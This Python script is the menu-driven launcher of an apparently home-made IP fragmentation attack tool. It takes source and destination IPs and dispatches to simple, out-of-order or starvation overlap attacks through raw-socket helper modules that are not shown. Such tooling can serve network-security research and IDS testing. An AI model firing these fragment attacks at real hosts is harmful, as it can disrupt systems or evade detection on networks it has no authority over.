# Attacker (Version 2) Code:

#Import Libraries:
import sys

#Import Functions:
from helper_functs.attackParamClass import attackParamClass
from helper_functs.rawsocket import rawSockGen
from helper_functs.ipFormCheck import ipFormCheck
from helper_functs.ipHeadFieldGen import ipHeadFieldGen
from helper_functs.simpleOverlapAttack import simpleOverlapAttackParam,simpleOverlapAttack
from helper_functs.OofOoverlapAttack import OofOoverlapAttackParam,OofOoverlapAttack
from helper_functs.overlapStarvationAttack import overlapStarvationAttackParam,overlapStarvationAttack

print("\nThe OverlapCraft Attacker (Version 3.0)\n")
print("Attack Modes*:")
print("1. Simple Overlap Fragments Attack")
print("2. Out-of-Order(O-of-O) Overlapping Fragments Attack")
print("3. Overlapping Starvation Fragments Attack")
print("------------------------------------------------------------")
print("*Refer to README file for more details about each attack.\n")


mode=input("Please select which attack mode would you like to perform [1]: ").strip()

if (mode!=""and mode!="1"and mode!="2"and mode!="3"):
    print(f"! Error: '{mode}' is not a valid mode. Please choose 1, 2, or 3 and try again!")
    sys.exit(1)

srcIP=input("Please enter the Source IP address: ").strip()
dstIP=input("Please enter the Destination IP address: ").strip()

if (srcIP=="" or dstIP==""):
    print("! Error: Both Source and Destination IP address are required. Please try again!")
    sys.exit(1)

print("\nOVERVIEW:")
print("---------\n")  

if (mode=="" or mode=="1"):
    attackParams,overlapInd=simpleOverlapAttackParam(srcIP,dstIP)
    simpleOverlapAttack(attackParams,overlapInd)
elif (mode=="2"):
    attackParams,overlapIndsList=OofOoverlapAttackParam(srcIP,dstIP)
    OofOoverlapAttack(attackParams,overlapIndsList)
elif (mode=="3"):
    attackParams=overlapStarvationAttackParam(srcIP,dstIP)
    overlapStarvationAttack(attackParams)